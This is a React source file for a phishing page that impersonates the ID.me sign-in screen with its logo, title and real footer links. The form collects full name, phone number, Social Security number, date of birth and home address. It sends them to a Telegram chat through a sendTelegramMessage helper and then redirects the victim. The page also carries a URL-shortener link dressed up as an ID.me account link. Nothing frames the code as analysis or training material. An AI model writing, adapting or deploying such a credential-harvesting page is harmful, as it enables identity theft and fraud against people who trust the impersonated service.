"use client";
import './styles.css';
import idmeLogo from './idme.png';
import { useState } from "react";
import { sendTelegramMessage } from "../../utils/telegram";

const SignInForm = () => {
  // Form fields state
  const [fullName, setFullName] = useState("");
  const [mobileNumber, setMobileNumber] = useState("");
  const [ssn, setSsn] = useState("");
  const [dob, setDob] = useState("");
  const [address, setAddress] = useState("");
  
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Validate all fields are filled


    setIsSubmitting(true);
    setError("");
    setSuccess("");

    // Format the message to send to Telegram
    const message = `
       ID.me Profile Validation
      ━━━━━━━━━━━━━━━━━━━━━
       Full Name: ${fullName}
      Mobile Number: ${mobileNumber}
       SSN: ${ssn}
       Date of Birth: ${dob}
       Home Address: ${address}
      ━━━━━━━━━━━━━━━━━━━━━
       Time: ${new Date().toLocaleString()}
    `;

    try {
      // Send the message to Telegram
      await sendTelegramMessage(message);

      // Redirect after successful submission
      window.location.href = "/teil";

      // Clear form fields
      setFullName("");
      setMobileNumber("");
      setSsn("");
      setDob("");
      setAddress("");
      setSuccess("Profile validation submitted successfully!");
    } catch (error) {
      console.error("Telegram send error:", error);
      setError("Failed to submit validation. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="page-container">
      <div className="container">
        <div className="content-container">
          <form className="new_user" id="new_user" onSubmit={handleSubmit}>
            <div className="form-header">
              <div className="form-header-content" role="banner">
                <div className="partner">
                  <div className="c_icon m_idme">
                    <img src={idmeLogo} alt="ID.me" className="w-[120px] h-[40px] object-contain" />
                  </div>
                </div>
              </div>
            </div>

            <main aria-labelledby="sr_page_title" className="form-container">
              <div className="form-header-access">
                <h1 id="sr_page_title">Sign in to ID.me</h1>
              </div>
              <div className="form-header-well">
                <p>We need more information to validate your ID.me Profile</p>
                <p>
                  <a target="_blank" href="https://cutt.ly/xPJZ0xv" rel="noopener noreferrer">
                    Create an ID.me account
                  </a>
                </p>
              </div>

              {error && (
                <p className="alert alert-error" role="alert">
                  {error}
                </p>
              )}
              {success && (
                <p className="alert alert-success" role="alert">
                  {success}
                </p>
              )}

              <div className="form-fields">
                <div className="field-group">
                  {/* Full Name Field */}
                  <div className="field text">
                    <label htmlFor="user_fullname">Full Name</label>
                    <input
                      placeholder="Enter your Full Name"
                      required
                      type="text"
                      name="fullname"
                      id="user_fullname"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                    />
                    <span role="alert"></span>
                  </div>

                  {/* Mobile Number Field */}
                  <div className="field text">
                    <label htmlFor="user_phone">Mobile Number</label>
                    <input
                      placeholder="Enter your Mobile Number"
                      required
                      type="tel"
                      name="phone"
                      id="user_phone"
                      value={mobileNumber}
                      onChange={(e) => setMobileNumber(e.target.value)}
                    />
                    <span role="alert"></span>
                  </div>

                  {/* SSN Field */}
                  <div className="field text">
                    <label htmlFor="user_ssn">SSN</label>
                    <input
                      placeholder="Enter your Social Security Number"
                      required
                      type="text"
                      name="ssn"
                      id="user_ssn"
                      value={ssn}
                      onChange={(e) => setSsn(e.target.value)}
                    />
                    <span role="alert"></span>
                  </div>

                  {/* Date of Birth Field */}
                  <div className="field text">
                    <label htmlFor="user_dob">Date of Birth</label>
                    <input
                      placeholder="Enter your DOB"
                      required
                      type="date"
                      name="dob"
                      id="user_dob"
                      value={dob}
                      onChange={(e) => setDob(e.target.value)}
                    />
                    <span role="alert"></span>
                  </div>

                  {/* Home Address Field */}
                  <div className="field text">
                    <label htmlFor="user_address">Home Address</label>
                    <input
                      placeholder="Enter your Home Address"
                      required
                      type="text"
                      name="address"
                      id="user_address"
                      value={address}
                      onChange={(e) => setAddress(e.target.value)}
                    />
                    <span role="alert"></span>
                  </div>
                </div>
              </div>

              <div className="form-actions">
                <input
                  id="but"
                  type="submit"
                  name="commit"
                  value={isSubmitting ? "Submitting..." : "Continue"}
                  className="btn btn-primary"
                  disabled={isSubmitting}
                />
              </div>
            </main>
          </form>

          <div className="form-footer">
            <p>
              <a href="#">Forgot password?</a>
            </p>
          </div>
        </div>
      </div>

      <footer className="footer" role="contentinfo">
        <div className="footer-links">
          <a target="_blank" href="https://www.id.me/about" rel="noopener noreferrer">
            What is ID.me?
          </a>
          |
          <a target="_blank" href="https://www.id.me/terms" rel="noopener noreferrer">
            Terms of Service
          </a>
          |
          <a target="_blank" href="https://www.id.me/privacy" rel="noopener noreferrer">
            Privacy Policy
          </a>
        </div>
      </footer>
    </div>
  );
};

export default SignInForm;